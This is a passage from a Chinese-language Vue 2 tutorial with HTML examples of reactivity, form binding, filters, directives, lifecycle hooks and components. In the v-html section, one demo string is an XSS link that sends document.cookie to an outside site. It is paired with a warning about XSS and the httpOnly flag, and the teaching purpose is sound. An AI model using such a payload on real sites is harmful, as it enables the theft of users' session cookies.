    <div id="root">
        <h1>学校信息</h1>
        <h2>学校名称：{{school.name}}</h2>
        <h2>学校地址：{{school.address}}</h2>
        <h2>校长：{{school.leader}}</h2>
        <hr/>
        <h2>学生信息</h2>
        <button @click="addSex">添加一个性别属性</button>
        <h2>姓名：{{student.name}}</h2>
        <h2 v-if="student.sex">性别：{{student.sex}}</h2>
        <h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>

        <button @click.once="addHobby">添加一个数组的元素</button>

        <h2>爱好</h2>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">
                {{h}}
            </li>
        </ul>

        <h2>朋友们</h2>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">
                {{f.name}}--{{f.age}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

        const vm = new Vue({
            el: '#root',
            data:{
                school:{
                    name: 'nullnull',
                    address: '上海'
                },
                student:{
                    name: 'tom',
                    age:{
                        rAge:40,
                        sAge:29
                    },
                    hobby:[
                        "写代码",
                        "跑步",
                        "打球"
                    ],
                    friends:[
                        {name:'jerry',age:35},
                        {name:'tony',age:36}
                    ]
                }
            },
            methods:{
                addSex(){
                    //Vue.set(this.student,'sex','男');
                    //此实例本身就是vue，所以可使用this
                    this.$set(this.student,'sex','男')
                },
                addHobby(){
                    //第一种写法
                    //this.student.hobby.push('睡觉');
                    //第二种写法
                    this.$set(this.student.hobby,3,'睡觉');
                }
            }
        });
    </script>
</body>
</html>
```

#### 1.11.10 总结

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-10-总结</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

    <div id="root">
        <h1>学生信息</h1>
        <button @click="student.age++">年龄+1</button><br/><br/>
        <button @click="addSex">添加性别属性，默认：男</button><br/><br/>
        <button @click="updSex">修改性别为女</button><br/><br/>
        <button @click="addFriend">在列表首位添加一个朋友</button><br/><br/>
        <button @click="updateFriend">修改第一位朋友的名称</button><br/><br/>
        <button @click="addhobby">添加一个爱好</button><br/><br/>
        <button @click="updhobby">修改一个爱好</button><br/><br/>
        <button @click="filterhobby">过滤掉爱好中的开车</button><br/><br/>
        <br/>
        <hr/>
        <h3>姓名：{{student.name}}</h3>
        <h3>年龄：{{student.age}}</h3>
        <h3 v-if="student.sex">性别：{{student.sex}}</h3>
        <h3>爱好：</h3>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">
                {{h}}
            </li>
        </ul>
        <h3>朋友们：</h3>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">
                {{f.name}}--{{f.age}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

        const vm = new Vue({
            el: '#root',
            data:{
                student:{
                    name: 'nullnull',
                    age: 18,
                    friends:[
                        {name:'张三',age:42},
                        {name:'李四',age:38},
                        {name:'王五',age:36}
                    ],
                    hobby: ['睡觉','写代码','游戏']
                }
            },
            methods:{
                addSex(){
                    this.$set(this.student,'sex','男');
                },
                updSex(){
                    this.$set(this.student,'sex','女');
                },
                addFriend(){
                    this.student.friends.unshift({name:'tony',age:40});
                },
                updateFriend(){
                    this.student.friends[0].name='二麻子';
                },
                addhobby(){
                    this.student.hobby.push('学习');
                },
                updhobby(){
                    //第一种写法
                    // this.student.hobby.splice(0,1,'开车');
                    //第二种写法
                    // Vue.set(this.student.hobby,0,'开车');
                    //第三种写法
                    this.$set(this.student.hobby,0,'开车');
                },
                filterhobby(){
                    this.student.hobby =   this.student.hobby.filter((h)=>{
                        return h != '开车';
                    })
                }
            }
        });
    </script>
</body>
</html>
```

### 1.12 收集表单数据

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-列表渲染</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        	<!-- 
			收集表单数据：
					若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
					若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
					若：<input type="checkbox"/>
							1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
							2.配置input的value属性:
									(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
									(2)v-model的初始值是数组，那么收集的的就是value组成的数组
					备注：v-model的三个修饰符：
									lazy：失去焦点再收集数据
									number：输入字符串转为有效的数字
									trim：输入首尾空格过滤
		-->
        <form @submit.prevent="submit">
                <!-- v-model.trim ：数据去掉前后的空格  -->
            账号：<input type="text" name="username" v-model.trim="userInfo.userName"> <br/><br/>
            密码：<input type="password" name="password" v-model="userInfo.password"> <br/><br/>
            <!-- v-model.number，数据使用数字类型  -->
            年龄: <input type="number" name="age" v-model.number="userInfo.age"> <br/><br/>
            性别: 
            男<input type="radio" name="sex" v-model="userInfo.sex" value="man" >
            女<input type="radio" name="sex" v-model="userInfo.sex" value="woman" > <br/><br/>
            爱好：
            学习<input type="checkbox" v-model="userInfo.hobby" value="study">
            游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
            吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat"><br/><br/>
            所在城市:
            <select v-model="userInfo.city">
                <option value="">请选择</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="wuhan">武汉</option>
                <option value="chengdu">成都</option>
            </select>
            <br/><br/>
            其他信息
            <!-- 失去焦点再收集 -->
            <textarea v-model.lazy="userInfo.other"></textarea><br/><br/>
            <input type="checkbox" v-model="userInfo.agree">
            阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
            <br/>
            <br/>
            <button>提交</button>

        </form>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                userInfo:{
                    userName: '',
                    password: '',
                    age: 18,
                    sex: 'woman',
                    hobby: [
                        "game"
                    ],
                    city: "shanghai",
                    other: '',
                    agree: ''
                }                
            },
            methods:{
                submit(){
                    console.log(JSON.stringify(this.userInfo));
                }
            }           
        })
    </script>
</body>
</html>
```



>收集表单数据：
>若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
>若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
>若：<input type="checkbox"/>
>1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
>2.配置input的value属性:
>(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
>(2)v-model的初始值是数组，那么收集的的就是value组成的数组
>备注：v-model的三个修饰符：
>lazy：失去焦点再收集数据
>number：输入字符串转为有效的数字
>trim：输入首尾空格过滤

### 1.13 过滤器调用

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-过滤器</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <script type="text/javascript" src="../js/dayjs.min.js"></script>
</head>
<body>
		<!-- 
			过滤器：
				定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
				语法：
						1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
						2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
				备注：
						1.过滤器也可以接收额外参数、多个过滤器也可以串联
						2.并没有改变原本的数据, 是产生新的对应的数据
		-->
    <div id="root">
        <h2>显示格式化后的时间</h2>
        <h3>原始的时间戳是：{{srcTime}}</h3>
        <!-- 计算属性实现 -->
        <h3>现在是:{{fmtTime}}</h3>
        <!-- 使用methods实现 -->
        <h3>现在是:{{getFmtTime()}}</h3>
        <!-- 过滤器实现 -->
        <h3>现在是:{{srcTime | timeFormat}}</h3>
        <!-- 过滤器实现带参数 -->
        <h3>现在是:{{srcTime | timeFormat('YYYY年MM月DD日 HH时mm分ss秒')}}</h3>
        <h3 :x="msg | methodSlice">局部方法过滤调用</h3>
        <h3 :x="msg | globeSlice">全局方法过滤调用</h3>
    </div>

    <div id="root2">

    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 

        //全局过滤器
        Vue.filter('globeSlice',function(value){
            console.log('全局调用',value);
            return value.slice(0,2);
        });

        const vm = new Vue({
            el: '#root',
            data:{
                //使用Date.now()函数获取
                srcTime: 1735957504953,
                msg: '你好，nullnull,天塌了'
            },
            computed:{
                fmtTime(){
                    return dayjs(this.srcTime).format('YYYY年MM月DD日 HH:mm:ss');
                }
            },
            methods: {
                getFmtTime()
                {
                    return dayjs(this.srcTime).format('YYYY-MM-DD HH:mm:ss');
                }                
            }, 
            filters:{
                timeFormat(value,format='YYYY/MM/DD HH:mm:ss')
                {
                    return dayjs(this.srcTime).format(format); 
                },
                methodSlice(value)
                {
                    console.log('调用',value);
                    return value.slice(0,3);
                }
            } 
        });

        const vm2 =new Vue({
			el:'#root2',
			data:{
				msg:'hello,你又去浪了'
			}
		});
    </script>
</body>
</html>
```



![image-20250104104238931](.\images\image-20250104104238931.png)



### 1.14 指令

#### 1.14.1 v-text指令

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-指令-text</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <script type="text/javascript" src="../js/dayjs.min.js"></script>
</head>
<body>

    <div id="root">
        <div>你好,{{name}}</div>
        <div v-text="name">1</div>
        <div v-text="str">2</div>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 

        const vm = new Vue({
            el: '#root',
            data:{
               name: 'text-name',
               str: '<h3>带html标签的文字</h3>'
            }
        });        
    </script>
</body>
</html>
```

输出

![image-20250104112634964](.\images\image-20250104112634964.png)



#### 1.14.2 v-html指令

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-指令-v-html</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <div>你好,{{name}}</div>
        <div v-html="str">1</div>
        <div v-html="strHref">2</div>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 

        const vm = new Vue({
            el: '#root',
            data:{
               name: 'text-name',
               str: '<h3>带html标签的文字</h3>',
               strHref: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>有惊喜哦！</a>'
            }
        });        
    </script>
</body>
</html>
```

效果

![image-20250104114914193](.\images\image-20250104114914193.png)

![image-20250104114937247](.\images\image-20250104114937247.png)

如果后端在响应的cookie 时没有设置httpOnly属性时，将会导致Cooke可以获取

![image-20250104120137912](.\images\image-20250104120137912.png)

![image-20250104120159887](.\images\image-20250104120159887.png)

当设置httpOnly属性后,则浏览器通过documnet.cookie便获取不到了

![image-20250104120318582](.\images\image-20250104120318582.png)

   ![image-20250104120340943](.\images\image-20250104120340943.png)



 v-html指令：

​            1.作用：向指定节点中渲染包含html结构的内容。

​            2.与插值语法的区别：

​                  (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。

​                  (2).v-html可以识别html结构。

​            3.严重注意：v-html有安全性问题！！！！

​                  (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。

​                  (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！



#### 1.14.3 v-cloak指令

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-指令-v-cloak</title>    
</head>
<body>
    <div id="root">
       <h2>{{name}}</h2>
       <!-- 当网速过慢时，此Vue.js会延迟加载5秒 -->
       <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
    </div>
    <script type="text/javascript" src="../js/vue.js"></script>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 

        const vm = new Vue({
            el: '#root',
            data:{
               name: '你好,nullnull'
            }
        });        
    </script>

</body>
</html>
```

当未加载到vue.js时，就时出现

![image-20250104130414191](.\images\image-20250104130414191.png)

而当js加载完成后，页面才能正常显示

![image-20250104130448557](.\images\image-20250104130448557.png)

那如何解决在未加载到vue.js文件时，页面显示的这些模板占位符的问题？

```html
<!--添加v-cloak指令，并配合CSS样式-->
<h2 v-cloak>{{name}}</h2>

<!--添加CSS-->
<style>
    [v-cloak]{
        display: none;
    }
</style>
```

那再打开页面就可以看到便是一片空白，而当页面加载到Vue后，v-cloak指令便会失效。页面即可正常加载。

>v-cloak指令（没有值）：
>1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
>2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。



#### 1.14.4 v-once指令

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-指令-v-one</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    
</head>
<body>
    
    <div id="root">
        <h2 v-once>当前的初始值是:{{num}}</h2>
        <h2>当前的值是:{{num}}</h2>
       <button @click="num++">点我加1</button>
    </div>
 
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 

        const vm = new Vue({
            el: '#root',
            data:{
               num: 1
            }
        });        
    </script>

</body>
</html>
```

输出：

![image-20250104131355134](.\images\image-20250104131355134.png)

总结：

>v-once指令：
>1.v-once所在节点在初次动态渲染后，就视为静态内容了。
>2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。



#### 1.14.5 v-pre指令

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-指令-v-pre</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    
</head>
<body>
    <div id="root">
        <h2 v-pre>这就一个普通的内容，不用解析</h2>
        <h2 v-pre v-once>当前的初始值是:{{num}}</h2>
        <h2 v-pre>当前的值是:{{num}}</h2>
    </div>
 
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 

        const vm = new Vue({
            el: '#root',
            data:{
               num: 1
            }
        });        
    </script>

</body>
</html>
```

输出：

![image-20250104132659291](.\images\image-20250104132659291.png)

加上v-pre后，Vue便不再解析此标签中的内容

v-pre指令：
1.跳过其所在节点的编译过程。
2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。



### 1.15 自定义指令

#### 1.15.1 简单片自定义指令

定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-自定义指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>{{name}}</h2>
        <h2>当前的初始值是:<span v-text="num"></span></h2>
        <!-- 自定义指令将num的放大10倍 -->
        <h2>放大10倍后的值:<span v-big="num"></span></h2>
    </div>
 
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 

        const vm = new Vue({
            el: '#root',
            data:{
               name: 'nullnull',
               num: 1
            },
            directives:{
                big(element,binging){
                    console.log("element对象是",element instanceof HTMLElement);
                    console.log("element对象是",binging);
                    element.innerText = binging.value*10;
                }
            }
        });        
    </script>
</body>
</html>
```

输出：

![image-20250104135812606](.\images\image-20250104135812606.png)

>
>
>big函数何时会被调用？
>
>1.指令与元素成功绑定时（首次页面加载时）。
>
>2.指令所在的模板被重新解析时。
>
>

#### 1.15.1 多单词定义

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-自定义指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <!-- 定义一个v-big-number指令，使用多单词 -->
    <div id="root">
        <h2>{{name}}</h2>
        <h2>当前的初始值是:<span v-big-number="num"></span></h2>
        <button @click="num++">点我加1</button>
    </div>
 
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 

        const vm = new Vue({
            el: '#root',
            data:{
               name: 'nullnull',
               num: 1
            },
            directives:{
                'big-number':function(element,binging){
                    element.innerText = binging.value*10;
                }
            }
        });        
    </script>
</body>
</html>
```





#### 1.15.2 回顾Dom操作

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>回顾Dom操作</title>
    <style>
        .backStyle{
            background-color: blue;
        }
    </style>
</head>
<body>
    <div id="root">
        <button id="btn">点我创建一个输入框</button>
    </div>
 
    <script type="text/javascript">
        const btn = document.getElementById('btn');
        btn.onclick=()=>{
            const input = document.createElement('input');
            input.className = 'backStyle';
            input.value = 99;

            document.body.appendChild(input);
            
            //此设置到页面时，有时机的限制，必须将元素加入页面后，才能进行页面的显示操作
            input.focus();
            console.log(input.parentElement);
        }

    </script>
</body>
</html>
```



#### 1.15.3 完整的事件处理

定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。

```html
<!DOCTYPE html>
<html>

<body>

    <head>
        <meta charset="UTF-8" />
        <title>VUE-自定义指令</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>

    <body>
        <!-- 需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。 -->
        <div id="root">
            <h2>{{name}}</h2>
            <h2>当前的初始值是:<span v-text="num"></span></h2>
            <button @click="num++">点我加1</button>
            <br />
            <hr />
            <input type="text" v-fbind:value="num">
        </div>

        <script type="text/javascript">
            //阻止 vue 在启动时生成生产提示。
            Vue.config.productionTip = false

            //定义全局指令
            Vue.directive('fbind',{
                          //指令与元素成功绑定时（页面加载时）
                          bind(element,binding){
                              //注意，在所有的指令中，此处的this都是window对象
                              console.log(this);
                              element.value = binding.value;
                          },
                          //指令所在元素被插入页面时
                          inserted(element,binding){
                              //让当前的input框获得焦点
                              element.focus();
                          },
                          //指令所在的模板被重新解析时
                          update(element,binding){
                              element.value = binding.value;
                          }
                      });
            

            const vm = new Vue({
                el: '#root',
                data: {
                    name: 'nullnull',
                    num: 1
                },
                directives: {
                    //局部指令的写法
                    /*   fbind:{
                          //指令与元素成功绑定时（页面加载时）
                          bind(element,binding){
                              //注意，在所有的指令中，此处的this都是window对象
                              console.log(this);
                              element.value = binding.value;
                          },
                          //指令所在元素被插入页面时
                          inserted(element,binding){
                              //让当前的input框获得焦点
                              element.focus();
                          },
                          //指令所在的模板被重新解析时
                          update(element,binding){
                              element.value = binding.value;
                          }
                      }  */
                }
            });        
        </script>
    </body>

</html>
```

总结：

>自定义指令总结：
>一、定义语法：
>(1).局部指令：
>new Vue({															new Vue({
>directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
>}) 																		})
>(2).全局指令：
>Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
>
>二、配置对象中常用的3个回调：
>(1).bind：指令与元素成功绑定时调用。
>(2).inserted：指令所在元素被插入页面时调用。
>(3).update：指令所在模板结构被重新解析时调用。
>
>三、备注：
>1.指令定义时不加v-，但使用时要加v-；
>2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。



### 1.16 生命周期

![生命周期](.\images\生命周期.png)

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-命令周期</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>{{num}}</h2>
        <button @click="add()">点我加1</button>
        <button @click="bye()">点我销毁</button>
    </div>
 
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 

        const vm = new Vue({
            el: '#root',
            data:{
               num: 1
            },
            methods: {
                add(){
                    console.log('add');
                    this.num++;
                },
                bye(){
                    console.log('bye');
                    this.$destroy();
                }
            },
            watch:{
                num(){
                    console.log('num变了');
                } 
            },
            //在初始化之前，具体是在初始化数据监听、数据代理
            //在beforeCreate无法通过vm访问到data中的数据、methods中的方法
            beforeCreate() {
                console.log('1,beforeCreate调用');
                console.log('data中的this',this);
                console.log('data中的_data还无法被访问',this._data);
                //debugger;
            },
            //在初始化之后，具体是在初始化数据监听、数据代理
            //在created方法中可以访问到data中的数据、methods中的方法
            created(){
                console.log('2,created调用');
                console.log('data中的this',this);
                console.log('data中的_data可以被访问',this._data);
                //debugger;
            },
            //在将内存中的虚拟DOM转换为真实DOM插入页面之前
            //1. 此时页面呈现未经Vue编译的DOM结构。
            //2. 所有对DOM的操作，最终都不奏效
            beforeMount(){
                console.log('3,beforeMount调用');
                console.log("显示显示未经过编译的DOM结构");
                //在此处做任何的设置，结果都不奏效
                document.querySelector('h2').innerText='不生效';
                // debugger;
            },
            //在将内存中的虚拟DOM转换为真实DOM插入页面之后
            //此时页面显示经过VUE编译的DOM
            //对DOM的操作均有效，但需要尽量避免，到此初始化后
            //一般在此进行开启定时器，发送网络请求，订阅消息，绑定自定义事件等初始化操作
            mounted(){
                console.log('4,mounted');
                console.log('可以进行一些初始化操作');
                //debugger;
            },
            //在将虚拟DOM更新到页面之前，
            //数据是最新的，但页面是旧的，即页面尚未数据保持同步
            beforeUpdate() {
                console.log('5,beforeUpdate');
                console.log('已经能够收到最新的值:'+this.num);
                //debugger;
            },
            //在将虚拟DOM更新到页面之后，
            //数据是最新的，但页面也是新的，即页面和数据保持同步
            updated(){
                console.log('6,updated');
                console.log('页面和数据都完成更新');
                //debugger;
            },
            //VM实例对象销毁之前，
            //此时VM中所有的,data、methods、指令等待，都处于可用状态，马上要执行销毁过程
            //一般在此阶段，关闭定时器、取消订阅消息、解绑自定义事件等收尾工作
            //此处已经不在响应页面的变化。
            beforeDestroy(){
                console.log('7,beforeDestory');
                console.log('销毁之前');
                this.num = 12
                //debugger;
            },
            //VM实例对象销毁之后
            destroyed() {
                console.log('8,destroyed');
                console.log('销毁完毕之后');
            }
        });        
    </script>
</body>
</html>
```

页面:

![image-20250104180904811](.\images\image-20250104180904811.png)

定时器的案例

```html
<!DOCTYPE html>
<html>

<body>

    <head>
        <meta charset="UTF-8" />
        <title>VUE-案例</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>

    <body>
        <div id="root">
            <!-- 当vue中的参数名与实例属性名一致时，可以使用此简写 -->
            <h2 :style="{opacity}">用于设置透明度的文字</h2>
            <button @click="opacity=1">透明度设置为1</button>
            <button @click="stop">点我停止变换</button>
        </div>

        <script type="text/javascript">
            //阻止 vue 在启动时生成生产提示。
            Vue.config.productionTip = false

            const vm = new Vue({
                el: '#root',
                data: {
                    opacity: 1
                },
                methods: {
                    stop() {
                        this.$destroy();
                    }
                },
                //VUE完成模板的解析并把真实的DOM元素放入页面后(挂载完毕)调用mounted
                mounted() {
                    console.log('mounted', this);
                    this.stoptimer =  setInterval(() => {
                        console.log('setInterval');
                        this.opacity -= 0.01
                        if (this.opacity <= 0) {
                            this.opacity = 1;
                        }
                    },50);
                },
                //在停止前，清理定时器
                beforeDestroy() {
                    console.log('销毁前的停止动作');
                    clearInterval(this.stoptimer);
                },
            });        
        </script>
    </body>

</html>
```

显示

![image-20250104182550913](.\images\image-20250104182550913.png)

>常用的生命周期钩子：
>1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
>2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
>
>关于销毁Vue实例
>1.销毁后借助Vue开发者工具看不到任何信息。
>2.销毁后自定义事件会失效，但原生DOM事件依然有效。
>3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
>
>

### 1.17 非单文件组件



#### 1.17.1 基本操作

```html
<!DOCTYPE html>
<html>
<body>
    <head>
        <meta charset="UTF-8" />
        <title>VUE-自定义标签</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>

    <body>
        <div id="root">
            <!-- 使用组件，使用注册的名称作为标签名 -->
            <!-- 全局标签 -->
            <hello></hello>
            <hr />
            <h1>{{msg}}</h1>
            <hr>
            <!-- 局部标签 -->
            <school></school>
            <hr />
            <student></student>
        </div>

        <hr />
        <hr />

        <div id="root2">
            <!-- 使用组件，使用注册的名称作为标签名 -->
            <!-- 全局标签 -->
            <hello></hello>
        </div>

        <script type="text/javascript">
            //阻止 vue 在启动时生成生产提示。
            Vue.config.productionTip = false

            //第一步创建学校组件
            const school = Vue.extend({
                template: `
            <div>
               	<h2>学校名称：{{schoolName}}</h2>
                <h2>学校地址：{{address}}</h2>
                <button @click="showName">点我提示学校名</button>	 
            </div>
            `,
                data() {
                    return {
                        schoolName: '人民大学',
                        address: '北京'
                    }
                },
                methods: {
                    showName() {
                        alert(this.schoolName);
                    }
                },
            });

            //创建学生组件
            const student = Vue.extend({
                template: `
            <div>
                <h2>学生名称：{{studentName}}</h2>
                <h2>学生年龄：{{studentAge}}</h2>
                <button @click="showStudentName">点我学生名称</button>	   
            </div>
            `,
                data() {
                    return {
                        studentName: '张三',
                        studentAge: 28
                    };
                },
                methods: {
                    showStudentName() {
                        alert(this.studentName);
                    }
                }
            });

            //创建hello组件
            const hello = Vue.extend({
                template: `
            <div>
                <h2>你好啊! {{name}}</h2>
            </div>
            `,
                data() {
                    return {
                        name: 'nullnull'
                    };
                }
            });


            //第二步注册组件

            //全局注册 hello组件
            Vue.component('hello', hello);

            //局部注册，此在创建Vue实例对象中
            new Vue({
                el: '#root',
                data: {
                    msg: '你好啊'
                },
                //此为局部注册组件
                components: {
                    school: school,
                    student
                }
            });

            new Vue({
                el: '#root2'
            });

        </script>
    </body>

</html>
```

输出

![image-20250105150635375](.\images\image-20250105150635375.png)



#### 1.17.2 注意事项

```html
<!DOCTYPE html>
<html>

<body>

    <head>
        <meta charset="UTF-8" />
        <title>VUE-自定义标签-注意事项</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>

    <body>
        <div id="root">
            <h1>{{msg}}</h1>
            <!-- 使用自定义的组件 -->
            <data-msg></data-msg>
        </div>

        <script type="text/javascript">
            //阻止 vue 在启动时生成生产提示。
            Vue.config.productionTip = false

            //定义组件
            const stData = Vue.extend({
                //定义组件的名称，用于Vue工具的名称显示
                name: 'comonent-name',
                template:`
                    <div>
                        <h2>名称：{{name}}</h2>
                        <h2>地址: {{address}}</h2>
                    </div>
                `,
                data(){
                    return {
                        name: 'nullnull',
                        address: 'shanghai'
                    }
                }
            });

            //局部组件的使用
            new Vue({
                el: '#root',
                data:{
                    msg: '欢迎来到Vue的世界!!'
                },
                components:{
                    'data-msg': stData
                }
            });

        </script>
    </body>

</html>
```

>几个注意点：
>1.关于组件名:
>一个单词组成：
>第一种写法(首字母小写)：school
>第二种写法(首字母大写)：School
>多个单词组成：
>第一种写法(kebab-case命名)：my-school
>第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
>备注：
>(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
>(2).可以使用name配置项指定组件在开发者工具中呈现的名字。
>
>2.关于组件标签:
>第一种写法：<school></school>
>第二种写法：<school/>
>备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。
>
>3.一个简写方式：
>const school = Vue.extend(options) 可简写为：const school = options
>
>

#### 1.17.3 嵌套

```html
<!DOCTYPE html>
<html>
<body>
    <head>
        <meta charset="UTF-8" />
        <title>VUE-自定义标签-嵌套</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>

    <body>
        <div id="root">
            <app></app>            
        </div>
        <script type="text/javascript">
            //阻止 vue 在启动时生成生产提示。
            Vue.config.productionTip = false


            //创建学生组件
            const student = Vue.extend({
                template: `
                <div>
                    <h2>学生名称：{{studentName}}</h2>
                    <h2>学生年龄：{{studentAge}}</h2>
                    <button @click="showStudentName">点我学生名称</button>	   
                </div>
            `,
                data() {
                    return {
                        studentName: '张三',
                        studentAge: 28
                    };
                },
                methods: {
                    showStudentName() {
                        alert(this.studentName);
                    }
                }
            });


            //第一步创建学校组件
            const school = Vue.extend({
                template: `
            <div>
               	<h2>学校名称：{{schoolName}}</h2>
                <h2>学校地址：{{address}}</h2>
                <button @click="showName">点我提示学校名</button>	 
                <hr/>
                <hr/>
                <student></student>
            </div>
            `,
                data() {
                    return {
                        schoolName: '人民大学',
                        address: '北京'
                    }
                },
                methods: {
                    showName() {
                        alert(this.schoolName);
                    }
                },
                components:{
                    student:student
                }
            });

            //创建hello组件
            const hello = Vue.extend({
                template: `
            <div>
                <h2>你好啊! {{name}}</h2>
            </div>
            `,
                data() {
                    return {
                        name: 'nullnull'
                    };
                }
            });

            //定义App组件，管理所有组件
            const app = Vue.extend({
                template:`
                <div>
                    <hello></hello>
                    <school></school>
                </div>
                `,
                components:{
                    hello:hello,
                    school:school
                }
            });
            //局部注册，此在创建Vue实例对象中
            new Vue({
                el: '#root',
                //此为局部注册组件
                components: {
                    app: app
                    
                }
            });
        </script>
    </body>

</html>
```

输出：

![image-20250105204527035](.\images\image-20250105204527035.png)



#### 1.17.4 VueComponent

```html
<!DOCTYPE html>
<html>

<body>

    <head>
        <meta charset="UTF-8" />
        <title>VUE-自定义标签-VueComponent</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>

    <body>
        <!-- 
          Vue.extend = function (extendOptions) {
          ......
          //定义子类构造函数
          var Sub = function VueComponent(options) {
              this._init(options);
          };
          //创建一个新的对象并赋值给原型链
          Sub.prototype = Object.create(Super.prototype);
          //修正子类的构造函数引用
          Sub.prototype.constructor = Sub;
          Sub.cid = cid++;
          ......
          return Sub;
      };
  }

        -->

        <div id="root">
            <school></school>
        </div>


        <script type="text/javascript">
            //阻止 vue 在启动时生成生产提示。
            Vue.config.productionTip = false


            //第一步创建学校组件
            const school = Vue.extend({
                template: `
                <div>
                    <h2>学校名称：{{schoolName}}</h2>
                    <h2>学校地址：{{address}}</h2>
                    <button @click="showName">点我提示学校名</button>	 
                    <hr/>
                </div>`,
